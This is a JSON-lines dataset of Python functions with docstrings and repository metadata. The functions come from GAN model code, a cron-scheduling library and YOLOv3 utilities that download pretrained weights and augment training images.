{"docstring": "\"\"\"ResNet block for the generator.\"\"\"\n", "func_signal": "def _resnet_block(self, name, in_channels, out_channels, scale):\n", "code": "if scale not in [\"up\", \"none\"]:\n  raise ValueError(\n      \"Unknown generator ResNet block scaling: {}.\".format(scale))\nreturn BigGanResNetBlock(\n    name=name,\n    in_channels=in_channels,\n    out_channels=out_channels,\n    scale=scale,\n    is_gen_block=True,\n    spectral_norm=self._spectral_norm,\n    batch_norm=self.batch_norm)", "path": "compare_gan/compare_gan/architectures/resnet_biggan.py", "commit_date": "2019-03-07 00:00:00", "repo_name": "google/compare_gan", "stars": 1817, "license": "apache-2.0", "language": "python", "size": 893}
{"docstring": "\"\"\"Returns the L2 penalty for each matrix/vector excluding biases.\n\nAssumes a specific tensor naming followed throughout the compare_gan library.\nWe penalize all fully connected, conv2d, and deconv2d layers.\n\nArgs:\n  discriminator: Instance of `AbstractDiscriminator`.\n\nReturns:\n   A tensor with the computed penalty.\n\"\"\"\n", "func_signal": "def l2_penalty(discriminator):\n", "code": "with tf.name_scope(\"l2_penalty\"):\n  d_weights = [v for v in discriminator.trainable_variables\n               if v.name.endswith(\"/kernel:0\")]\n  return tf.reduce_mean(\n      [tf.nn.l2_loss(i) for i in d_weights], name=\"l2_penalty\")", "path": "compare_gan/compare_gan/gans/penalty_lib.py", "commit_date": "2019-03-07 00:00:00", "repo_name": "google/compare_gan", "stars": 1817, "license": "apache-2.0", "language": "python", "size": 893}
{"docstring": "\"\"\"Apply the discriminator on a input.\n\nArgs:\n  x: `Tensor` of shape [batch_size, ?, ?, ?] with real or fake images.\n  y: `Tensor` of shape [batch_size, num_classes] with one hot encoded\n    labels.\n  is_training: Boolean, whether the architecture should be constructed for\n    training or inference.\n\nReturns:\n  Tuple of 3 Tensors, the final prediction of the discriminator, the logits\n  before the final output activation function and logits form the second\n  last layer.\n\"\"\"\n", "func_signal": "def apply(self, x, y, is_training):\n", "code": "use_sn = self._spectral_norm\nbatch_size = x.shape.as_list()[0]\n# Resulting shape: [bs, h/2, w/2, 64].\nnet = lrelu(conv2d(x, 64, 4, 4, 2, 2, name=\"d_conv1\", use_sn=use_sn))\n# Resulting shape: [bs, h/4, w/4, 128].\nnet = conv2d(net, 128, 4, 4, 2, 2, name=\"d_conv2\", use_sn=use_sn)\nnet = self.batch_norm(net, y=y, is_training=is_training, name=\"d_bn2\")\nnet = lrelu(net)\n# Resulting shape: [bs, h * w * 8].\nnet = tf.reshape(net, [batch_size, -1])\n# Resulting shape: [bs, 1024].\nnet = linear(net, 1024, scope=\"d_fc3\", use_sn=use_sn)\nnet = self.batch_norm(net, y=y, is_training=is_training, name=\"d_bn3\")\nnet = lrelu(net)\n# Resulting shape: [bs, 1].\nout_logit = linear(net, 1, scope=\"d_fc4\", use_sn=use_sn)\nout = tf.nn.sigmoid(out_logit)\nreturn out, out_logit, net", "path": "compare_gan/compare_gan/architectures/infogan.py", "commit_date": "2019-02-26 00:00:00", "repo_name": "google/compare_gan", "stars": 1817, "license": "apache-2.0", "language": "python", "size": 893}
{"docstring": "\"\"\"Apply the discriminator on a input.\n\nArgs:\n  x: `Tensor` of shape [batch_size, ?, ?, ?] with real or fake images.\n  y: `Tensor` of shape [batch_size, num_classes] with one hot encoded\n    labels.\n  is_training: Boolean, whether the architecture should be constructed for\n    training or inference.\n\nReturns:\n  Tuple of 3 Tensors, the final prediction of the discriminator, the logits\n  before the final output activation function and logits form the second\n  last layer.\n\"\"\"\n", "func_signal": "def apply(self, x, y, is_training):\n", "code": "logging.info(\"[Discriminator] inputs are x=%s, y=%s\", x.shape,\n             None if y is None else y.shape)\nresnet_ops.validate_image_inputs(x)\n\nin_channels, out_channels = self._get_in_out_channels(\n    colors=x.shape[-1].value, resolution=x.shape[1].value)\nnum_blocks = len(in_channels)\n\nnet = x\nfor block_idx in range(num_blocks):\n  name = \"B{}\".format(block_idx + 1)\n  is_last_block = block_idx == num_blocks - 1\n  block = self._resnet_block(\n      name=name,\n      in_channels=in_channels[block_idx],\n      out_channels=out_channels[block_idx],\n      scale=\"none\" if is_last_block else \"down\")\n  net = block(net, z=None, y=y, is_training=is_training)\n  if name in self._blocks_with_attention:\n    logging.info(\"[Discriminator] Applying non-local block to %s\",\n                 net.shape)\n    net = ops.non_local_block(net, \"non_local_block\",\n                              use_sn=self._spectral_norm)\n\n# Final part\nlogging.info(\"[Discriminator] before final processing: %s\", net.shape)\nnet = tf.nn.relu(net)\nh = tf.math.reduce_sum(net, axis=[1, 2])\nout_logit = ops.linear(h, 1, scope=\"final_fc\", use_sn=self._spectral_norm)\nlogging.info(\"[Discriminator] after final processing: %s\", net.shape)\nif self._project_y:\n  if y is None:\n    raise ValueError(\"You must provide class information y to project.\")\n  with tf.variable_scope(\"embedding_fc\"):\n    y_embedding_dim = out_channels[-1]\n    # We do not use ops.linear() below since it does not have an option to\n    # override the initializer.\n    kernel = tf.get_variable(\n        \"kernel\", [y.shape[1], y_embedding_dim], tf.float32,\n        initializer=tf.initializers.glorot_normal())\n    if self._spectral_norm:\n      kernel = ops.spectral_norm(kernel)\n    embedded_y = tf.matmul(y, kernel)\n    logging.info(\"[Discriminator] embedded_y for projection: %s\",\n                 embedded_y.shape)\n    out_logit += tf.reduce_sum(embedded_y * h, axis=1, keepdims=True)\nout = tf.nn.sigmoid(out_logit)\nreturn out, out_logit, h", "path": "compare_gan/compare_gan/architectures/resnet_biggan.py", "commit_date": "2019-03-07 00:00:00", "repo_name": "google/compare_gan", "stars": 1817, "license": "apache-2.0", "language": "python", "size": 893}
{"docstring": "\"\"\"Verify that the test cases runs on a TPU chip and has 2 cores.\"\"\"\n", "func_signal": "def testRunsOnTpu(self):\n", "code": "expected_device_names = [\n    \"/job:localhost/replica:0/task:0/device:CPU:0\",\n    \"/job:localhost/replica:0/task:0/device:TPU:0\",\n    \"/job:localhost/replica:0/task:0/device:TPU:1\",\n    \"/job:localhost/replica:0/task:0/device:TPU_SYSTEM:0\",\n]\nwith self.session() as sess:\n  devices = sess.list_devices()\n  tf.logging.info(\"devices:\\n%s\", \"\\n\".join([str(d) for d in devices]))\n  self.assertAllEqual([d.name for d in devices], expected_device_names)", "path": "compare_gan/compare_gan/architectures/arch_ops_tpu_test.py", "commit_date": "2019-02-26 00:00:00", "repo_name": "google/compare_gan", "stars": 1817, "license": "apache-2.0", "language": "python", "size": 893}
{"docstring": "\"\"\"Build the generator network for the given inputs.\n\nArgs:\n  z: `Tensor` of shape [batch_size, z_dim] with latent code.\n  y: `Tensor` of shape [batch_size, num_classes] with one hot encoded\n    labels.\n  is_training: boolean, are we in train or eval model.\n\nReturns:\n  A tensor of size [batch_size] + self._image_shape with values in [0, 1].\n\"\"\"\n# Each block upscales by a factor of 2.\n", "func_signal": "def apply(self, z, y, is_training):\n", "code": "seed_size = 4\nimage_size = self._image_shape[0]\n\n# Map noise to the actual seed.\nnet = ops.linear(\n    z,\n    self._ch * self._channels[0] * seed_size * seed_size,\n    scope=\"fc_noise\")\n# Reshape the seed to be a rank-4 Tensor.\nnet = tf.reshape(\n    net,\n    [-1, seed_size, seed_size, self._ch * self._channels[0]],\n    name=\"fc_reshaped\")\n\nup_layers = np.log2(float(image_size) / seed_size)\nif not up_layers.is_integer():\n  raise ValueError(\"log2({}/{}) must be an integer.\".format(\n      image_size, seed_size))\nif up_layers < 0 or up_layers > 5:\n  raise ValueError(\"Invalid image_size {}.\".format(image_size))\nup_layers = int(up_layers)\n\nfor block_idx in range(5):\n  block = self._resnet_block(\n      name=\"B{}\".format(block_idx + 1),\n      in_channels=self._ch * self._channels[block_idx],\n      out_channels=self._ch * self._channels[block_idx + 1],\n      scale=\"up\" if block_idx < up_layers else \"none\")\n  net = block(net, z=z, y=y, is_training=is_training)\n\nnet = self.batch_norm(\n    net, z=z, y=y, is_training=is_training, name=\"final_norm\")\nnet = tf.nn.relu(net)\nnet = ops.conv2d(net, output_dim=self._image_shape[2],\n                 k_h=3, k_w=3, d_h=1, d_w=1, name=\"final_conv\")\nnet = tf.nn.sigmoid(net)\nreturn net", "path": "compare_gan/compare_gan/architectures/resnet5.py", "commit_date": "2019-02-26 00:00:00", "repo_name": "google/compare_gan", "stars": 1817, "license": "apache-2.0", "language": "python", "size": 893}
{"docstring": "\"\"\"Import a module based on a string.\n\n:param import_name: the dotted name for the object to import.\n:return: imported object\n\"\"\"\n", "func_signal": "def import_string(import_name):\n", "code": "assert isinstance(import_name, string_types)\nif '.' in import_name:\n    module, obj = import_name.rsplit('.', 1)\nelse:\n    return __import__(import_name)\nif PY2 and isinstance(obj, unicode):\n    obj = obj.encode('utf-8')\nreturn getattr(__import__(module, None, None, [obj]), obj)", "path": "plan/plan/testsuite/__init__.py", "commit_date": "2014-07-21 00:00:00", "repo_name": "fengsp/plan", "stars": 1166, "license": "other", "language": "python", "size": 704}
{"docstring": "\"\"\"Parse at value into (at_type, moment) pairs.\n\"\"\"\n", "func_signal": "def parse_at(self):\n", "code": "pairs = dict()\nif not self.at:\n    return pairs\n\nprocessed_at = self.preprocess_at(self.at)\nats = processed_at.split(' ')\nat_map = collections.defaultdict(list)\n\n# Parse at value into (at_type, moments_list) pairs.\n# One same at_type can have multiple moments like:\n# at = \"minute.5 minute.10 hour.2\"\nfor at in ats:\n    if 'minute.' in at:\n        at_type, moment = MINUTE, get_moment(at)\n        if moment not in range(60):\n            raise ParseError(\"Your at value %s is invalid\"\n                             \" out of minute range[0-59]\" % self.at)\n    elif 'hour.' in at:\n        at_type, moment = HOUR, get_moment(at)\n        if moment not in range(24):\n            raise ParseError(\"Your at value %s is invalid\"\n                             \" out of hour range[0-23]\" % self.at)\n    elif 'day.' in at:\n        at_type, moment = DAY, get_moment(at)\n        if moment not in range(1, 32):\n            raise ParseError(\"Your at value %s is invalid\"\n                             \" out of month day range[1-31]\" % self.at)\n    elif 'month.' in at or 'year.' in at:\n        raise ParseError(\"Your at value %s is invalid\"\n                         \" can not set month or year\" % self.at)\n    elif is_week(at):\n        at_type = WEEK\n        moment = self.parse_week(at)\n    else:\n        raise ParseError(\"Your at value %s is invalid\" % self.at)\n    if moment not in at_map[at_type]:\n        at_map[at_type].append(moment)\n\n# comma seperate same at_type moments\nfor at_type, moments in iteritems(at_map):\n    moments = map(str, moments)\n    pairs[at_type] = ','.join(moments)\n\nreturn pairs", "path": "plan/plan/job.py", "commit_date": "2019-12-30 00:00:00", "repo_name": "fengsp/plan", "stars": 1166, "license": "other", "language": "python", "size": 704}
{"docstring": "\"\"\"Run bootstrap commands.\n\"\"\"\n", "func_signal": "def run_bootstrap_commands(self):\n", "code": "if self.bootstrap_commands:\n    Echo.secho(\"Starting bootstrap...\", fg=\"green\")\n    for command in self.bootstrap_commands:\n        command = shlex.split(command)\n        subprocess.call(command)\n    Echo.secho(\"Bootstrap finished!\\n\\n\", fg=\"green\")", "path": "plan/plan/core.py", "commit_date": "2015-02-16 00:00:00", "repo_name": "fengsp/plan", "stars": 1166, "license": "other", "language": "python", "size": 704}
{"docstring": "\"\"\"Do preprocess for at value, just modify \"12:12\" style moment into\n\"hour.12 minute.12\" style moment value.\n\n:param at: The at value you want to do preprocess.\n\"\"\"\n", "func_signal": "def preprocess_at(self, at):\n", "code": "ats = at.split(' ')\nprocessed_ats = []\nfor at in ats:\n    if ':' in at:\n        hour, minute = at.split(':')[:2]\n        if minute.startswith('0') and len(minute) >= 2:\n            minute = minute[1]\n        hour = 'hour.' + hour\n        minute = 'minute.' + minute\n        processed_ats.append(hour)\n        processed_ats.append(minute)\n    else:\n        processed_ats.append(at)\nreturn ' '.join(processed_ats)", "path": "plan/plan/job.py", "commit_date": "2019-12-30 00:00:00", "repo_name": "fengsp/plan", "stars": 1166, "license": "other", "language": "python", "size": 704}
{"docstring": "\"\"\"Parses day of week name into week numbers.\n\n:param week: this parameter can be the following values:\n\n                 sun mon tue wed thu fri sat\n                 sunday monday tuesday wednesday thursday friday\n                 saturday\n                 weekday weekend(case insenstive)\n\"\"\"\n", "func_signal": "def parse_week(self, week):\n", "code": "if week.lower() == \"weekday\":\n    return \"1,2,3,4,5\"\nelif week.lower() == \"weekend\":\n    return \"6,0\"\nelse:\n    week = week[:3].lower()\n    return WEEK_MAP[week]", "path": "plan/plan/job.py", "commit_date": "2019-12-30 00:00:00", "repo_name": "fengsp/plan", "stars": 1166, "license": "other", "language": "python", "size": 704}
{"docstring": "\"\"\"Get binary content for binary_writer.\"\"\"\n", "func_signal": "def get_binary_content(content):\n", "code": "if isinstance(content, text_type):\n    return content.encode('utf-8')\nreturn content", "path": "plan/plan/_compat.py", "commit_date": "2014-06-18 00:00:00", "repo_name": "fengsp/plan", "stars": 1166, "license": "other", "language": "python", "size": 704}
{"docstring": "\"\"\"Register bootstrap commands.\n\n:param command_or_commands: One command or a list of commands.\n\"\"\"\n", "func_signal": "def bootstrap(self, command_or_commands):\n", "code": "if isinstance(command_or_commands, string_types):\n    self.bootstrap_commands.append(command_or_commands)\nelif isinstance(command_or_commands, list):\n    self.bootstrap_commands.extend(command_or_commands)", "path": "plan/plan/core.py", "commit_date": "2015-02-16 00:00:00", "repo_name": "fengsp/plan", "stars": 1166, "license": "other", "language": "python", "size": 704}
{"docstring": "\"\"\"Register one command, takes the same parameters as\n:class:`~plan.Job`.\"\"\"\n", "func_signal": "def command(self, *args, **kwargs):\n", "code": "job = CommandJob(*args, **kwargs)\nself.job(job)", "path": "plan/plan/core.py", "commit_date": "2015-02-16 00:00:00", "repo_name": "fengsp/plan", "stars": 1166, "license": "other", "language": "python", "size": 704}
{"docstring": "\"\"\"Translate frequency into comma separated times.\n\"\"\"\n# how many units one time type have\n", "func_signal": "def produce_frequency_time(self, frequency, maximum, start=0):\n", "code": "length = maximum - start + 1\n# if every is the same with unit length\nif frequency == length:\n    return str(start)\n# else if every is one unit, we use '*'\nelif frequency == 1:\n    return '*'\n# otherwise, we make steps comma separated\nelse:\n    times = list(range(start, maximum + 1, frequency))\n    if length % frequency:\n        del times[0]\n    times = map(str, times)\n    return ','.join(times)", "path": "plan/plan/job.py", "commit_date": "2019-12-30 00:00:00", "repo_name": "fengsp/plan", "stars": 1166, "license": "other", "language": "python", "size": 704}
{"docstring": "\"\"\"Generator for all testsuites.\"\"\"\n", "func_signal": "def iter_suites():\n", "code": "for module in find_modules(__name__):\n    mod = import_string(module)\n    if hasattr(mod, 'suite'):\n        yield mod.suite()", "path": "plan/plan/testsuite/__init__.py", "commit_date": "2014-07-21 00:00:00", "repo_name": "fengsp/plan", "stars": 1166, "license": "other", "language": "python", "size": 704}
{"docstring": "\"\"\"Update the current cronfile, used by run_type `update` or `clear`.\nThis will find the block inside cronfile corresponding to this Plan\nobject and replace it.\n\n:param update_type: update or clear, if you choose update, the block\n                    corresponding to this plan object will be replaced\n                    with the new cron job entries, otherwise, they\n                    will be wiped.\n\"\"\"\n", "func_signal": "def update_crontab(self, update_type):\n", "code": "current_crontab = self.read_crontab()\n\nif update_type == \"update\":\n    action = \"updated\"\n    crontab_content = self.cron_content\nelif update_type == \"clear\":\n    action = \"cleared\"\n    crontab_content = ''\n\n# Check for unbegined or unended block\ncomment_begin_re = re.compile(r\"^%s$\" % self.comment_begin, re.M)\ncomment_end_re = re.compile(r\"^%s$\" % self.comment_end, re.M)\ncron_block_re = re.compile(r\"^%s$.+^%s$\" %\n                           (self.comment_begin, self.comment_end),\n                           re.M | re.S)\n\ncomment_begin_match = comment_begin_re.search(current_crontab)\ncomment_end_match = comment_end_re.search(current_crontab)\n\nif comment_begin_match and not comment_end_match:\n    raise PlanError(\"Your crontab file is not ended, it contains \"\n                    \"'%s', but no '%s'\" % (self.comment_begin,\n                                           self.comment_end))\nelif not comment_begin_match and comment_end_match:\n    raise PlanError(\"Your crontab file has no begining, it contains \"\n                    \"'%s', but no '%s'\" % (self.comment_end,\n                                           self.comment_begin))\n\n# Found our existing block and replace it with the new one\n# Otherwise, append out new cron jobs after others\nif comment_begin_match and comment_end_match:\n    updated_content = cron_block_re.sub(crontab_content,\n                                        current_crontab)\nelse:\n    updated_content = \"\\n\\n\".join((current_crontab, crontab_content))\n\n# Write the updated cronfile back to crontab\nself._write_to_crontab(action, updated_content)", "path": "plan/plan/core.py", "commit_date": "2015-02-16 00:00:00", "repo_name": "fengsp/plan", "stars": 1166, "license": "other", "language": "python", "size": 704}
{"docstring": "\"\"\"Validate every and at value.\n\nevery can be::\n\n    [1-60].minute [1-24].hour [1-31].day\n    [1-12].month [1].year\n    jan feb mar apr may jun jul aug sep oct nov dec\n    sun mon tue wed thu fri sat weekday weekend\n    or any fullname of month names and day of week names\n    (case insensitive)\n\nat::\n\n    when every is minute, can not be set\n    when every is hour, can be minute.[0-59]\n    when every is day of month, can be minute.[0-59], hour.[0-23]\n    when every is month, can be day.[1-31], day of week,\n                         minute.[0-59], hour.[0-23]\n    when every is day of week, can be minute.[0-59], hour.[0-23]\n\n    at can also be multiple at values seperated by one space.\n\"\"\"\n", "func_signal": "def validate_time(self):\n", "code": "every_type, every = self.parse_every(), self.every\nats = self.parse_at()\nif every_type == MINUTE:\n    if ats:\n        raise ValidationError(\"at can not be set when every is\"\n                              \" minute related\")\nelif every_type == HOUR:\n    for at_type in ats:\n        if at_type not in (MINUTE):\n            raise ValidationError(\"%s can not be set when every is\"\n                                  \" hour related\" % at_type)\nelif every_type == DAY:\n    for at_type in ats:\n        if at_type not in (MINUTE, HOUR):\n            raise ValidationError(\"%s can not be set when every is\"\n                                  \" month day related\" % at_type)\nelif every_type == MONTH:\n    for at_type in ats:\n        if at_type not in (MINUTE, HOUR, DAY, WEEK):\n            raise ValidationError(\"%s can not be set when every is\"\n                                  \" month related\" % at_type)\nelif every_type == WEEK:\n    for at_type in ats:\n        if at_type not in (MINUTE, HOUR):\n            raise ValidationError(\"%s can not be set when every is\"\n                                  \" week day related\" % at_type)\n\nreturn every_type, every, ats", "path": "plan/plan/job.py", "commit_date": "2019-12-30 00:00:00", "repo_name": "fengsp/plan", "stars": 1166, "license": "other", "language": "python", "size": 704}
{"docstring": "\"\"\"Parses month into month numbers.  Month can only occur in\nevery value.\n\n:param month: this parameter can be the following values:\n\n                  jan feb mar apr may jun jul aug sep oct nov dec\n                  and all of those full month names(case insenstive)\n                  or <int:n>.month\n\"\"\"\n", "func_signal": "def parse_month(self, month):\n", "code": "if '.' in month:\n    frequency = get_frequency(month)\n    return self.produce_frequency_time(frequency, 12, 1)\nelse:\n    month = month[:3].lower()\n    return MONTH_MAP[month]", "path": "plan/plan/job.py", "commit_date": "2019-12-30 00:00:00", "repo_name": "fengsp/plan", "stars": 1166, "license": "other", "language": "python", "size": 704}
{"docstring": "\"\"\"Use this to do any action on this Plan object.\n\n:param run_type: The running type, one of (\"check\", \"write\",\n                 \"update\", \"clear\"), default to be \"check\"\n\"\"\"\n", "func_signal": "def run(self, run_type=\"check\"):\n", "code": "self.run_bootstrap_commands()\nif run_type == \"update\" or run_type == \"clear\":\n    self.update_crontab(run_type)\nelif run_type == \"write\":\n    self.write_crontab()\nelse:\n    Echo.echo(self.cron_content)\n    Echo.message(\"Your crontab file was not updated.\")", "path": "plan/plan/core.py", "commit_date": "2015-02-16 00:00:00", "repo_name": "fengsp/plan", "stars": 1166, "license": "other", "language": "python", "size": 704}
{"docstring": "\"\"\"Tell whether time is one of the days of week.\n\n:param time: a string of time.\n\"\"\"\n", "func_signal": "def is_week(time):\n", "code": "return time[:3].lower() in WEEK_MAP or \\\n    time.lower() in ('weekday', 'weekend')", "path": "plan/plan/job.py", "commit_date": "2019-12-30 00:00:00", "repo_name": "fengsp/plan", "stars": 1166, "license": "other", "language": "python", "size": 704}
{"docstring": "\"\"\"Find all modules under one package.\n\"\"\"\n", "func_signal": "def find_modules(import_name):\n", "code": "module = import_string(import_name)\npath = getattr(module, '__path__', None)\nif path is None:\n    raise ValueError('%s is not a package' % import_name)\nbasename = module.__name__ + '.'\nfor importer, modname, ispkg in pkgutil.iter_modules(path):\n    modname = basename + modname\n    if not ispkg:\n        yield modname", "path": "plan/plan/testsuite/__init__.py", "commit_date": "2014-07-21 00:00:00", "repo_name": "fengsp/plan", "stars": 1166, "license": "other", "language": "python", "size": 704}
{"docstring": "\"\"\"Your schedule jobs converted to cron syntax.\"\"\"\n", "func_signal": "def cron_content(self):\n", "code": "return \"\\n\".join([self.comment_begin] + self.environment_variables +\n                 self.crons + [self.comment_end]) + \"\\n\"", "path": "plan/plan/core.py", "commit_date": "2015-02-16 00:00:00", "repo_name": "fengsp/plan", "stars": 1166, "license": "other", "language": "python", "size": 704}
{"docstring": "\"\"\"plan-quickstart\"\"\"\n", "func_signal": "def quickstart(path):\n", "code": "write = True\nif os.path.isfile(path):\n    write = click.confirm(\"'%s' already exists, override?\" % path)\nif write:\n    Echo.add(\"writing '%s'\" % path)\n    with open(path, 'wb') as f:\n        f.write(get_binary_content(SCHEDULE_TEMPLATE))\n    Echo.done()", "path": "plan/plan/commands.py", "commit_date": "2014-07-11 00:00:00", "repo_name": "fengsp/plan", "stars": 1166, "license": "other", "language": "python", "size": 704}
{"docstring": "\"\"\"Cron content time part.\n\"\"\"\n", "func_signal": "def time_in_cron_syntax(self):\n", "code": "if CRON_TIME_SYNTAX_RE.match(self.every):\n    return self.every\nelif self.every in PREDEFINED_DEFINITIONS:\n    return \"@%s\" % self.every\nelse:\n    return self.parse_time()", "path": "plan/plan/job.py", "commit_date": "2019-12-30 00:00:00", "repo_name": "fengsp/plan", "stars": 1166, "license": "other", "language": "python", "size": 704}
{"docstring": "\"\"\"Register one module, takes the same parameters as\n:class:`~plan.Job`.\"\"\"\n", "func_signal": "def module(self, *args, **kwargs):\n", "code": "job = ModuleJob(*args, **kwargs)\nself.job(job)", "path": "plan/plan/core.py", "commit_date": "2015-02-16 00:00:00", "repo_name": "fengsp/plan", "stars": 1166, "license": "other", "language": "python", "size": 704}
{"docstring": "# Attempt to download pretrained weights if not found locally\n\n", "func_signal": "def attempt_download(weights):\n", "code": "msg = weights + ' missing, download from https://drive.google.com/drive/folders/1uxgUBemJVw9wZsdpboYbzUN4bcRhsuAI'\nif weights and not os.path.isfile(weights):\n    file = Path(weights).name\n\n    if file == 'yolov3-spp.weights':\n        gdrive_download(id='1oPCHKsM2JpM-zgyepQciGli9X0MTsJCO', name=weights)\n    elif file == 'yolov3-spp.pt':\n        gdrive_download(id='1vFlbJ_dXPvtwaLLOu-twnjK4exdFiQ73', name=weights)\n    elif file == 'yolov3.pt':\n        gdrive_download(id='11uy0ybbOXA2hc-NJkJbbbkDwNX1QZDlz', name=weights)\n    elif file == 'yolov3-tiny.pt':\n        gdrive_download(id='1qKSgejNeNczgNNiCn9ZF_o55GFk1DjY_', name=weights)\n    elif file == 'darknet53.conv.74':\n        gdrive_download(id='18xqvs_uwAqfTXp-LJCYLYNHBOcrwbrp0', name=weights)\n    elif file == 'yolov3-tiny.conv.15':\n        gdrive_download(id='140PnSedCsGGgu3rOD6Ez4oI6cdDzerLC', name=weights)\n\n    else:\n        try:  # download from pjreddie.com\n            url = 'https://pjreddie.com/media/files/' + file\n            print('Downloading ' + url)\n            os.system('curl -f ' + url + ' -o ' + weights)\n        except IOError:\n            print(msg)\n            os.system('rm ' + weights)  # remove partial downloads\n\n    assert os.path.exists(weights), msg  # download missing weights from Google Drive", "path": "yolov3-channel-and-layer-pruning/models.py", "commit_date": "2020-07-07 00:00:00", "repo_name": "tanluren/yolov3-channel-and-layer-pruning", "stars": 1481, "license": "apache-2.0", "language": "python", "size": 1586}
{"docstring": "# https://gist.github.com/tanaikech/f0f2d122e05bf5f971611258c22c110f\n# Downloads a file from Google Drive, accepting presented query\n# from utils.google_utils import *; gdrive_download()\n", "func_signal": "def gdrive_download(id='1HaXkef9z6y5l4vUnCYgdmEAj61c6bfWO', name='coco.zip'):\n", "code": "t = time.time()\n\nprint('Downloading https://drive.google.com/uc?export=download&id=%s as %s... ' % (id, name), end='')\nif os.path.exists(name):  # remove existing\n    os.remove(name)\n\n# Attempt large file download\ns = [\"curl -c ./cookie -s -L \\\"https://drive.google.com/uc?export=download&id=%s\\\" > /dev/null\" % id,\n     \"curl -Lb ./cookie -s \\\"https://drive.google.com/uc?export=download&confirm=`awk '/download/ {print $NF}' ./cookie`&id=%s\\\" -o %s\" % (\n         id, name),\n     'rm ./cookie']\n[os.system(x) for x in s]  # run commands\n\n# Attempt small file download\nif not os.path.exists(name):  # file size < 40MB\n    s = 'curl -f -L -o %s https://drive.google.com/uc?export=download&id=%s' % (name, id)\n    os.system(s)\n\n# Unzip if archive\nif name.endswith('.zip'):\n    print('unzipping... ', end='')\n    os.system('unzip -q %s' % name)  # unzip\n    os.remove(name)  # remove zip to free space\n\nprint('Done (%.1fs)' % (time.time() - t))", "path": "yolov3-channel-and-layer-pruning/utils/google_utils.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "tanluren/yolov3-channel-and-layer-pruning", "stars": 1481, "license": "apache-2.0", "language": "python", "size": 1586}
{"docstring": "# Plots a line-by-line description of a PyTorch model\n", "func_signal": "def model_info(model, report='summary'):\n", "code": "n_p = sum(x.numel() for x in model.parameters())  # number parameters\nn_g = sum(x.numel() for x in model.parameters() if x.requires_grad)  # number gradients\nif report is 'full':\n    print('%5s %40s %9s %12s %20s %10s %10s' % ('layer', 'name', 'gradient', 'parameters', 'shape', 'mu', 'sigma'))\n    for i, (name, p) in enumerate(model.named_parameters()):\n        name = name.replace('module_list.', '')\n        print('%5g %40s %9s %12g %20s %10.3g %10.3g' %\n              (i, name, p.requires_grad, p.numel(), list(p.shape), p.mean(), p.std()))\nprint('Model Summary: %g layers, %g parameters, %g gradients' % (len(list(model.parameters())), n_p, n_g))", "path": "yolov3-channel-and-layer-pruning/utils/torch_utils.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "tanluren/yolov3-channel-and-layer-pruning", "stars": 1481, "license": "apache-2.0", "language": "python", "size": 1586}
{"docstring": "# torchvision.transforms.RandomAffine(degrees=(-10, 10), translate=(.1, .1), scale=(.9, 1.1), shear=(-10, 10))\n# https://medium.com/uruvideo/dataset-augmentation-with-random-homographies-a8f4b44830d4\n\n", "func_signal": "def random_affine(img, targets=(), degrees=10, translate=.1, scale=.1, shear=10):\n", "code": "if targets is None:\n    targets = []\nborder = 0  # width of added border (optional)\nheight = img.shape[0] + border * 2\nwidth = img.shape[1] + border * 2\n\n# Rotation and Scale\nR = np.eye(3)\na = random.uniform(-degrees, degrees)\n# a += random.choice([-180, -90, 0, 90])  # add 90deg rotations to small rotations\ns = random.uniform(1 - scale, 1 + scale)\nR[:2] = cv2.getRotationMatrix2D(angle=a, center=(img.shape[1] / 2, img.shape[0] / 2), scale=s)\n\n# Translation\nT = np.eye(3)\nT[0, 2] = random.uniform(-translate, translate) * img.shape[0] + border  # x translation (pixels)\nT[1, 2] = random.uniform(-translate, translate) * img.shape[1] + border  # y translation (pixels)\n\n# Shear\nS = np.eye(3)\nS[0, 1] = math.tan(random.uniform(-shear, shear) * math.pi / 180)  # x shear (deg)\nS[1, 0] = math.tan(random.uniform(-shear, shear) * math.pi / 180)  # y shear (deg)\n\nM = S @ T @ R  # Combined rotation matrix. ORDER IS IMPORTANT HERE!!\nimw = cv2.warpAffine(img, M[:2], dsize=(width, height), flags=cv2.INTER_AREA,\n                     borderValue=(128, 128, 128))  # BGR order borderValue\n\n# Return warped points also\nif len(targets) > 0:\n    n = targets.shape[0]\n    points = targets[:, 1:5].copy()\n    area0 = (points[:, 2] - points[:, 0]) * (points[:, 3] - points[:, 1])\n\n    # warp points\n    xy = np.ones((n * 4, 3))\n    xy[:, :2] = points[:, [0, 1, 2, 3, 0, 3, 2, 1]].reshape(n * 4, 2)  # x1y1, x2y2, x1y2, x2y1\n    xy = (xy @ M.T)[:, :2].reshape(n, 8)\n\n    # create new boxes\n    x = xy[:, [0, 2, 4, 6]]\n    y = xy[:, [1, 3, 5, 7]]\n    xy = np.concatenate((x.min(1), y.min(1), x.max(1), y.max(1))).reshape(4, n).T\n\n    # # apply angle-based reduction of bounding boxes\n    # radians = a * math.pi / 180\n    # reduction = max(abs(math.sin(radians)), abs(math.cos(radians))) ** 0.5\n    # x = (xy[:, 2] + xy[:, 0]) / 2\n    # y = (xy[:, 3] + xy[:, 1]) / 2\n    # w = (xy[:, 2] - xy[:, 0]) * reduction\n    # h = (xy[:, 3] - xy[:, 1]) * reduction\n    # xy = np.concatenate((x - w / 2, y - h / 2, x + w / 2, y + h / 2)).reshape(4, n).T\n\n    # reject warped points outside of image\n    xy[:, [0, 2]] = xy[:, [0, 2]].clip(0, width)\n    xy[:, [1, 3]] = xy[:, [1, 3]].clip(0, height)\n    w = xy[:, 2] - xy[:, 0]\n    h = xy[:, 3] - xy[:, 1]\n    area = w * h\n    ar = np.maximum(w / (h + 1e-16), h / (w + 1e-16))\n    i = (w > 4) & (h > 4) & (area / (area0 + 1e-16) > 0.1) & (ar < 10)\n\n    targets = targets[i]\n    targets[:, 1:5] = xy[i]\n\nreturn imw, targets", "path": "yolov3-channel-and-layer-pruning/utils/datasets.py", "commit_date": "2020-04-30 00:00:00", "repo_name": "tanluren/yolov3-channel-and-layer-pruning", "stars": 1481, "license": "apache-2.0", "language": "python", "size": 1586}
